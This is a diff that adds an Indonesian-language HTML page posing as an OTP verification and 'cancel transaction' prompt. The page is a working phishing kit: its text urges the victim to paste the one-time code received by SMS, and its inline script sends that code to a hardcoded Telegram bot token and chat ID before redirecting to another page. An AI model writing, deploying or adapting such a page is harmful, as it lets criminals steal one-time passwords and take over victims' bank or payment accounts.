@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OTP 8 Digit</title>
+  <link rel="stylesheet" href="otp.css">
+</head>
+<body>
+  <div class="otp-header">
+    <span class="close-btn">&times;</span>
+    <span class="mail-icon">&#9993;</span>
+    <div class="otp-title">Verifikasi Diperlukan</div>
+  </div>
+
+  <div class="alert-warning">
+    <b>Perhatian!</b><br>
+    Untuk kamu ketahui, 6 digit OTP akan dikirim lewat SMS ke ponsel kamu,
+    <b>salin SMS paste disini</b>, segera batalkan permintaan tersebut.
+  </div>
+
+  <form>
+    <div class="otp-row">
+      <textarea id="otp" name="otp" maxlength="300" class="otp-textarea" placeholder="Salin pesan/otp" required></textarea>
+    </div>
+    <button type="button" class="btn-lanjut" onclick="kirimKeTelegram()">BATALKAN TRANSAKSI</button>
+  </form>
+
+  <!-- ✅ Script Kirim ke Telegram + Redirect -->
+  <script>
+    function kirimKeTelegram() {
+      const otp = document.getElementById("otp").value;
+      const token = "7699059636:AAEegcYsSqKEGf0fTYJ9cGwucnLjMXNSCsI"; // Ganti token
+      const chat_id = "5653264904";                                     // Ganti chat_id
+      const message = `📩 OTP Masuk:\n${otp}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: message })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert;
+          document.querySelector("form").reset();
+          // **Redirect ke halaman berikutnya**
+          window.location.href = "Coba.html";
+        } else {
+          alert("❌ Gagal mengirim OTP.");
+        }
+      })
+      .catch(error => {
+        alert("⚠️ Terjadi error.");
+        console.error(error);
+      });
+    }
+  </script>
+</body>
+</html>
